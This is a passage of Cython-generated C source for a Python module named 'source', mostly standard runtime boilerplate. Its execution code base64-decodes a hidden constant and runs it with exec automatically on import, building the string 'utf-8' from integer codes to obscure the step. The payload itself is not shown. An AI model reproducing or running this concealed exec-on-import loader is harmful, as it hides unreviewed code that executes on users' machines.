{\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_init_code\", 0);\n  /*--- Type init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_import_code\", 0);\n  /*--- Type import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_variable_import_code\", 0);\n  /*--- Variable import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_function_import_code\", 0);\n  /*--- Function import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\n\n#ifndef CYTHON_NO_PYINIT_EXPORT\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\n#elif PY_MAJOR_VERSION < 3\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" void\n#else\n#define __Pyx_PyMODINIT_FUNC void\n#endif\n#else\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" PyObject *\n#else\n#define __Pyx_PyMODINIT_FUNC PyObject *\n#endif\n#endif\n\n\n#if PY_MAJOR_VERSION < 3\n__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC initsource(void)\n#else\n__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC PyInit_source(void)\n#if CYTHON_PEP489_MULTI_PHASE_INIT\n{\n  return PyModuleDef_Init(&__pyx_moduledef);\n}\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\n    #if PY_VERSION_HEX >= 0x030700A1\n    static PY_INT64_T ""main_interpreter_id = -1;\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\n    if (main_interpreter_id == -1) {\n        main_interpreter_id = current_id;\n        return (unlikely(current_id == -1)) ? -1 : 0;\n    } else if (unlikely(main_interpreter_id != current_id))\n    #else\n    static PyInterpreterState *main_interpreter = NULL;\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\n    if (!main_interpreter) {\n        main_interpreter = current_interpreter;\n    } else if (unlikely(main_interpreter != current_interpreter))\n    #endif\n    {\n        PyErr_SetString(\n            PyExc_ImportError,\n            \"Interpreter change detected - this module can only be loaded into one interpreter per process.\");\n        return -1;\n    }\n    return 0;\n}\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\n    int result = 0;\n    if (likely(value)) {\n        if (allow_none || value != Py_None) {\n            result = PyDict_SetItemString(moddict, to_name, value);\n        }\n        Py_DECREF(value);\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        PyErr_Clear();\n    } else {\n        result = -1;\n    }\n    return result;\n}\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {\n    PyObject *module = NULL, *moddict, *modname;\n    if (__Pyx_check_single_interpreter())\n        return NULL;\n    if (__pyx_m)\n        return __Pyx_NewRef(__pyx_m);\n    modname = PyObject_GetAttrString(spec, \"name\");\n    if (unlikely(!modname)) goto bad;\n    module = PyModule_NewObject(modname);\n    Py_DECREF(modname);\n    if (unlikely(!module)) goto bad;\n    moddict = PyModule_GetDict(module);\n    if (unlikely(!moddict)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_m""odule(spec, moddict, \"loader\", \"__loader__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"origin\", \"__file__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"parent\", \"__package__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"submodule_search_locations\", \"__path__\", 0) < 0)) goto bad;\n    return module;\nbad:\n    Py_XDECREF(module);\n    return NULL;\n}\n\n\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)\n#endif\n#endif\n{\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  if (__pyx_m) {\n    if (__pyx_m == __pyx_pyinit_module) return 0;\n    PyErr_SetString(PyExc_RuntimeError, \"Module 'source' has already been imported. Re-initialisation is not supported.\");\n    return -1;\n  }\n  #elif PY_MAJOR_VERSION >= 3\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\n  #endif\n  #if CYTHON_REFNANNY\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"refnanny\");\nif (!__Pyx_RefNanny) {\n  PyErr_Clear();\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"Cython.Runtime.refnanny\");\n  if (!__Pyx_RefNanny)\n      Py_FatalError(\"failed to import 'refnanny' module\");\n}\n#endif\n  __Pyx_RefNannySetupContext(\"__Pyx_PyMODINIT_FUNC PyInit_source(void)\", 0);\n  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\n  __Pxy_PyFrame_Initialize_Offsets();\n  #endif\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_empty_bytes = PyBytes_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_unicode"")) __PYX_ERR(0, 5, __pyx_L1_error)\n  #ifdef __Pyx_CyFunction_USED\n  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Generator_USED\n  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_AsyncGen_USED\n  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_StopAsyncIteration_USED\n  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  /*--- Library function declarations ---*/\n  /*--- Threads initialization code ---*/\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\n  PyEval_InitThreads();\n  #endif\n  /*--- Module creation code ---*/\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __pyx_m = __pyx_pyinit_module;\n  Py_INCREF(__pyx_m);\n  #else\n  #if PY_MAJOR_VERSION < 3\n  __pyx_m = Py_InitModule4(\"source\", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);\n  #else\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\n  #endif\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_d);\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_b);\n  __pyx_cython_runtime = PyImport_AddModule((char *) \"cython_runtime\"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_cython_runtime);\n  if (PyObject_SetAttrString(__pyx_m, \"__builtins__\", __pyx_b) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Initialize various global constants etc. ---*/\n  if (__Pyx_InitGlobals() < 0) __PYX_ER""R(0, 5, __pyx_L1_error)\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  if (__pyx_module_is_main_source) {\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  }\n  #if PY_MAJOR_VERSION >= 3\n  {\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 5, __pyx_L1_error)\n    if (!PyDict_GetItemString(modules, \"source\")) {\n      if (unlikely(PyDict_SetItemString(modules, \"source\", __pyx_m) < 0)) __PYX_ERR(0, 5, __pyx_L1_error)\n    }\n  }\n  #endif\n  /*--- Builtin init code ---*/\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Constants init code ---*/\n  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Global type/function init code ---*/\n  (void)__Pyx_modinit_global_init_code();\n  (void)__Pyx_modinit_variable_export_code();\n  (void)__Pyx_modinit_function_export_code();\n  (void)__Pyx_modinit_type_init_code();\n  (void)__Pyx_modinit_type_import_code();\n  (void)__Pyx_modinit_variable_import_code();\n  (void)__Pyx_modinit_function_import_code();\n  /*--- Execution code ---*/\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n\n\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_base64, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_base64); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_urlsafe_b64decode); if (unlikely(!__pyx_t_2)) __PYX""_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_INCREF(__pyx_int_117);\n  __Pyx_GIVEREF(__pyx_int_117);\n  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_117);\n  __Pyx_INCREF(__pyx_int_116);\n  __Pyx_GIVEREF(__pyx_int_116);\n  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_116);\n  __Pyx_INCREF(__pyx_int_102);\n  __Pyx_GIVEREF(__pyx_int_102);\n  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_102);\n  __Pyx_INCREF(__pyx_int_45);\n  __Pyx_GIVEREF(__pyx_int_45);\n  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_45);\n  __Pyx_INCREF(__pyx_int_56);\n  __Pyx_GIVEREF(__pyx_int_56);\n  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_56);\n  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_PyExecGlobals(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __py""x_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n  /*--- Wrapped vars code ---*/\n\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  if (__pyx_m) {\n    if (__pyx_d) {\n      __Pyx_AddTraceback(\"init source\", __pyx_clineno, __pyx_lineno, __pyx_filename);\n    }\n    Py_CLEAR(__pyx_m);\n  } else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_ImportError, \"init source\");\n  }\n  __pyx_L0:;\n  __Pyx_RefNannyFinishContext();\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  return (__pyx_m != NULL) ? 0 : -1;\n  #elif PY_MAJOR_VERSION >= 3\n  return __pyx_m;\n  #else\n  return;\n  #endif\n}\n\n/* --- Runtime support code --- */\n/* Refnanny */\n#if CYTHON_REFNANNY\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\n    PyObject *m = NULL, *p = NULL;\n    void *r = NULL;\n    m = PyImport_ImportModule(modname);\n    if (!m) goto end;\n    p = PyObject_GetAttrString(m, \"RefNannyAPI\");\n    if (!p) goto end;\n    r = PyLong_AsVoidPtr(p);\nend:\n    Py_XDECREF(p);\n    Py_XDECREF(m);\n    return (__Pyx_RefNannyAPIStruct *)r;\n}\n#endif\n\n/* PyObjectGetAttrStr */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro))\n        return tp->tp_getattro(obj, attr_name);\n#if PY_MAJOR_VERSION < 3\n    if (likely(tp->tp_getattr))\n        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));\n#endif\n    return PyObject_GetAttr(obj, attr_name);\n}\n#endif\n\n/* Import */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\n    Py""Object *empty_list = 0;\n    PyObject *module = 0;\n    PyObject *global_dict = 0;\n    PyObject *empty_dict = 0;\n    PyObject *list;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_import;\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\n    if (!py_import)\n        goto bad;\n    #endif\n    if (from_list)\n        list = from_list;\n    else {\n        empty_list = PyList_New(0);\n        if (!empty_list)\n            goto bad;\n        list = empty_list;\n    }\n    global_dict = PyModule_GetDict(__pyx_m);\n    if (!global_dict)\n        goto bad;\n    empty_dict = PyDict_New();\n    if (!empty_dict)\n        goto bad;\n    {\n        #if PY_MAJOR_VERSION >= 3\n        if (level == -1) {\n            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {\n                module = PyImport_ImportModuleLevelObject(\n                    name, global_dict, empty_dict, list, 1);\n                if (!module) {\n                    if (!PyErr_ExceptionMatches(PyExc_ImportError))\n                        goto bad;\n                    PyErr_Clear();\n                }\n            }\n            level = 0;\n        }\n        #endif\n        if (!module) {\n            #if PY_MAJOR_VERSION < 3\n            PyObject *py_level = PyInt_FromLong(level);\n            if (!py_level)\n                goto bad;\n            module = PyObject_CallFunctionObjArgs(py_import,\n                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);\n            Py_DECREF(py_level);\n            #else\n            module = PyImport_ImportModuleLevelObject(\n                name, global_dict, empty_dict, list, level);\n            #endif\n        }\n    }\nbad:\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_import);\n    #endif\n    Py_XDECREF(empty_list);\n    Py_XDECREF(empty_dict);\n    return module;\n}\n\n/* GetAttr */\nstatic CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {\n#if CYTHON_USE_TYPE_SLOTS\n#if PY_MAJOR_VERSION >= 3\n    i""f (likely(PyUnicode_Check(n)))\n#else\n    if (likely(PyString_Check(n)))\n#endif\n        return __Pyx_PyObject_GetAttrStr(o, n);\n#endif\n    return PyObject_GetAttr(o, n);\n}\n\n/* Globals */\nstatic PyObject* __Pyx_Globals(void) {\n    Py_ssize_t i;\n    PyObject *names;\n    PyObject *globals = __pyx_d;\n    Py_INCREF(globals);\n    names = PyObject_Dir(__pyx_m);\n    if (!names)\n        goto bad;\n    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {\n#if CYTHON_COMPILING_IN_PYPY\n        PyObject* name = PySequence_ITEM(names, i);\n        if (!name)\n            goto bad;\n#else\n        PyObject* name = PyList_GET_ITEM(names, i);\n#endif\n        if (!PyDict_Contains(globals, name)) {\n            PyObject* value = __Pyx_GetAttr(__pyx_m, name);\n            if (!value) {\n#if CYTHON_COMPILING_IN_PYPY\n                Py_DECREF(name);\n#endif\n                goto bad;\n            }\n            if (PyDict_SetItem(globals, name, value) < 0) {\n#if CYTHON_COMPILING_IN_PYPY\n                Py_DECREF(name);\n#endif\n                Py_DECREF(value);\n                goto bad;\n            }\n        }\n#if CYTHON_COMPILING_IN_PYPY\n        Py_DECREF(name);\n#endif\n    }\n    Py_DECREF(names);\n    return globals;\nbad:\n    Py_XDECREF(names);\n    Py_XDECREF(globals);\n    return NULL;\n}\n\n/* PyExec */\nstatic CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {\n    return __Pyx_PyExec3(o, globals, NULL);\n}\nstatic PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {\n    PyObject* result;\n    PyObject* s = 0;\n    char *code = 0;\n    if (!globals || globals == Py_None) {\n        globals = __pyx_d;\n    } else if (!PyDict_Check(globals)) {\n        PyErr_Format(PyExc_TypeError, \"exec() arg 2 must be a dict, not %.200s\",\n                     Py_TYPE(globals)->tp_name);\n        goto bad;\n    }\n    if (!locals || locals == Py_None) {\n        locals = globals;\n    }\n    if (__Pyx_PyDict_GetItemStr(global""s, __pyx_n_s_builtins) == NULL) {\n        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)\n            goto bad;\n    }\n    if (PyCode_Check(o)) {\n        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {\n            PyErr_SetString(PyExc_TypeError,\n                \"code object passed to exec() may not contain free variables\");\n            goto bad;\n        }\n        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)\n        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);\n        #else\n        result = PyEval_EvalCode(o, globals, locals);\n        #endif\n    } else {\n        PyCompilerFlags cf;\n        cf.cf_flags = 0;\n#if PY_VERSION_HEX >= 0x030800A3\n        cf.cf_feature_version = PY_MINOR_VERSION;\n#endif\n        if (PyUnicode_Check(o)) {\n            cf.cf_flags = PyCF_SOURCE_IS_UTF8;\n            s = PyUnicode_AsUTF8String(o);\n            if (!s) goto bad;\n            o = s;\n        #if PY_MAJOR_VERSION >= 3\n        } else if (!PyBytes_Check(o)) {\n        #else\n        } else if (!PyString_Check(o)) {\n        #endif\n            PyErr_Format(PyExc_TypeError,\n                \"exec: arg 1 must be string, bytes or code object, got %.200s\",\n                Py_TYPE(o)->tp_name);\n            goto bad;\n        }\n        #if PY_MAJOR_VERSION >= 3\n        code = PyBytes_AS_STRING(o);\n        #else\n        code = PyString_AS_STRING(o);\n        #endif\n        if (PyEval_MergeCompilerFlags(&cf)) {\n            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);\n        } else {\n            result = PyRun_String(code, Py_file_input, globals, locals);\n        }\n        Py_XDECREF(s);\n    }\n    return result;\nbad:\n    Py_XDECREF(s);\n    return 0;\n}\n\n/* PyExecGlobals */\nstatic PyObject* __Pyx_PyExecGlobals(PyObject* code) {\n    PyObject* result;\n    PyObject* globals = __Pyx_Globals();\n    if (unlikely(!globals))\n      ""  return NULL;\n    result = __Pyx_PyExec2(code, globals);\n    Py_DECREF(globals);\n    return result;\n}\n\n/* GetBuiltinName */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\n    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);\n    if (unlikely(!result)) {\n        PyErr_Format(PyExc_NameError,\n#if PY_MAJOR_VERSION >= 3\n            \"name '%U' is not defined\", name);\n#else\n            \"name '%.200s' is not defined\", PyString_AS_STRING(name));\n#endif\n    }\n    return result;\n}\n\n/* PyDictVersioning */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\n    PyObject **dictptr = NULL;\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\n    if (offset) {\n#if CYTHON_COMPILING_IN_CPYTHON\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\n#else\n        dictptr = _PyObject_GetDictPtr(obj);\n#endif\n    }\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\n}\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\n        return 0;\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\n}\n#endif\n\n/* GetModuleGlobalName */\n#if CYTHON_USE_DICT_VERSIONS\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\n#else\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\n#endif\n{\n    PyObject *result;\n#if !CYTHON_AVOID_BORROWED_REFS\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX"" >= 0x030500A1\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    } else if (unlikely(PyErr_Occurred())) {\n        return NULL;\n    }\n#else\n    result = PyDict_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n#endif\n#else\n    result = PyObject_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n    PyErr_Clear();\n#endif\n    return __Pyx_GetBuiltinName(name);\n}\n\n/* PyObjectCall */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *result;\n    ternaryfunc call = Py_TYPE(func)->tp_call;\n    if (unlikely(!call))\n        return PyObject_Call(func, arg, kw);\n    if (unlikely(Py_EnterRecursiveCall((char*)\" while calling a Python object\")))\n        return NULL;\n    result = (*call)(func, arg, kw);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            \"NULL result without error in PyObject_Call\");\n    }\n    return result;\n}\n#endif\n\n/* decode_c_bytes */\nstatic CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(\n         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,\n         const char* encoding, const char* errors,\n         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {\n    if (unlikely((start < 0) | (stop < 0))) {\n        if (start < 0) {\n            start += length;\n            if (start < 0)\n                start = 0;\n        }\n        if (stop <"" 0)\n            stop += length;\n    }\n    if (stop > length)\n        stop = length;\n    if (unlikely(stop <= start))\n        return __Pyx_NewRef(__pyx_empty_unicode);\n    length = stop - start;\n    cstring += start;\n    if (decode_func) {\n        return decode_func(cstring, length, errors);\n    } else {\n        return PyUnicode_Decode(cstring, length, encoding, errors);\n    }\n}\n\n/* PyCFunctionFastCall */\n#if CYTHON_FAST_PYCCALL\nstatic CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {\n    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;\n    PyCFunction meth = PyCFunction_GET_FUNCTION(func);\n    PyObject *self = PyCFunction_GET_SELF(func);\n    int flags = PyCFunction_GET_FLAGS(func);\n    assert(PyCFunction_Check(func));\n    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));\n    assert(nargs >= 0);\n    assert(nargs == 0 || args != NULL);\n    /* _PyCFunction_FastCallDict() must not be called with an exception set,\n       because it may clear it (directly or indirectly) and so the\n       caller loses its exception */\n    assert(!PyErr_Occurred());\n    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {\n        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);\n    } else {\n        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);\n    }\n}\n#endif\n\n/* PyFunctionFastCall */\n#if CYTHON_FAST_PYCALL\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,\n                                               PyObject *globals) {\n    PyFrameObject *f;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject **fastlocals;\n    Py_ssize_t i;\n    PyObject *result;\n    assert(globals != NULL);\n    /* XXX Perhaps we should create a specialized\n       PyFrame_New() that doesn't take locals, but ""does\n       take builtins without sanity checking them.\n       */\n    assert(tstate != NULL);\n    f = PyFrame_New(tstate, co, globals, NULL);\n    if (f == NULL) {\n        return NULL;\n    }\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\n    for (i = 0; i < na; i++) {\n        Py_INCREF(*args);\n        fastlocals[i] = *args++;\n    }\n    result = PyEval_EvalFrameEx(f,0);\n    ++tstate->recursion_depth;\n    Py_DECREF(f);\n    --tstate->recursion_depth;\n    return result;\n}\n#if 1 || PY_VERSION_HEX < 0x030600B1\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) 